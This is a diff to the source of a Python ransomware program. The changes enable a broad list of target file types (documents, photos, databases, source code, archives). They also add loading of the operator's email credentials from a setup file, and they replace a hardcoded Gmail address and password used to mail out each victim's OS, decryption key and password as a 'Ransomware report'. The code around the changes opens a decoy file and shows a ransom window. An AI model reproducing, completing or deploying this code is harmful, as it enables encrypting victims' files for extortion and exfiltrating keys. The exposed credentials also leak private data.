@@ -10,6 +10,7 @@ from PIL import ImageTk, Image
 from threading import Thread
 import subprocess
 
+import setup
 import modules.cryptography
 import modules.send_email
 import modules.validate_input
@@ -21,30 +22,33 @@ from modules.normalize_path_name import normalize_path_name
 
 class Ransomware:
     def __init__(self, starting_dir_test):
-        # self.interesting_extensions = [
-        #     'dwg', 'dxf', 'rtd', 'rft', 'rte', 'rvg', 'ies', 'rfa', 'rds'
-        #                                                             'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd',
-        #     'raw',
-        #     'mp3', 'mp4', 'm4a', 'aac', 'ogg', 'flac', 'wav', 'wma', 'aiff', 'ape',
-        #     'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp',
-        #     'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx',
-        #     'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', 'mobi',
-        #     'yml', 'yaml', 'json', 'xml', 'csv',
-        #     'db', 'sql', 'dbf', 'mdb', 'iso',
-        #     'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css',
-        #     'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx',
-        #     'java', 'class', 'jar',
-        #     'ps', 'bat', 'vb',
-        #     'awk', 'sh', 'cgi', 'pl', 'ada', 'swift',
-        #     'go', 'py', 'pyc', 'bf', 'coffee',
-        #     'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',
-        # ]
+        self.interesting_extensions = [
+            'dwg', 'dxf', 'rtd', 'rft', 'rte', 'rvg', 'ies', 'rfa', 'rds'
+                                                                    'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd',
+            'raw',
+            'mp3', 'mp4', 'm4a', 'aac', 'ogg', 'flac', 'wav', 'wma', 'aiff', 'ape',
+            'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp',
+            'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx',
+            'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', 'mobi',
+            'yml', 'yaml', 'json', 'xml', 'csv',
+            'db', 'sql', 'dbf', 'mdb', 'iso',
+            'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css',
+            'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx',
+            'java', 'class', 'jar',
+            'ps', 'bat', 'vb',
+            'awk', 'sh', 'cgi', 'pl', 'ada', 'swift',
+            'go', 'py', 'pyc', 'bf', 'coffee',
+            'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',
+        ]
 
         self.interesting_extensions_tests = ['txt']
         self.starting_dir_test = starting_dir_test
+        self.user_email = ''
+        self.user_password = ''
 
     def main(self):
         # start = time.time()
+        self.check_user_info()
 
         self.open_fake_file()
 
@@ -65,11 +69,23 @@ class Ransomware:
         gui = RansomGUI(os.path.expanduser('~'), generate_key)
         gui.show_message()
 
+    def check_user_info(self):
+        user_files = os.listdir('./user_info')
+
+        if not user_files:
+            messagebox.showerror('ERROR', 'To use program you have to set it up first! Run "python3 setup.py" in main directory first!')
+            sys.exit(1)
+        else:
+            with open(f'./user_info/{user_files[0]}') as user_info:
+                content = user_info.read()
+
+                info = json.loads(content)
+                self.user_email = info['email']
+                self.user_password = info['password']
 
     def gen_pass(self):
         new_password = modules.cryptography.generate_password()
         return new_password
-
 
     def handle_key(self):
         key = modules.cryptography.generate_key(passwd)
@@ -89,7 +105,7 @@ class Ransomware:
         is_connection = modules.check_connection.check_connection()
         bin_key = key['bin_key']
 
-        self.create_copy_of_key(key, main_dir)
+        self.create_copy_of_key(key)
 
         while not is_connection:
             time.sleep(10)
@@ -98,14 +114,14 @@ class Ransomware:
 
         try:
             message_body = "OS: {}\nKey_dec: {}\nPassword: {}\nHashing_algorithm(password): SHA256\nEncryption_algorithm: AES".format(platform.system(), bin_key, passwd)
-            modules.send_email.send_mail('transfered.data@gmail.com', '__47ck3r__', message_body, 'Ransomware report')
+            modules.send_email.send_mail(self.user_email, self.user_password, message_body, 'Ransomware report')
 
             self.remove_copy_of_key(main_dir)
         except:
             self.handle_mail(key, passwd)
 
 
-    def create_copy_of_key(self, key, dir_to):
+    def create_copy_of_key(self, key):
         dir_to = sys._MEIPASS
 
         path = normalize_path_name(dir_to, 'sys_config.txt')
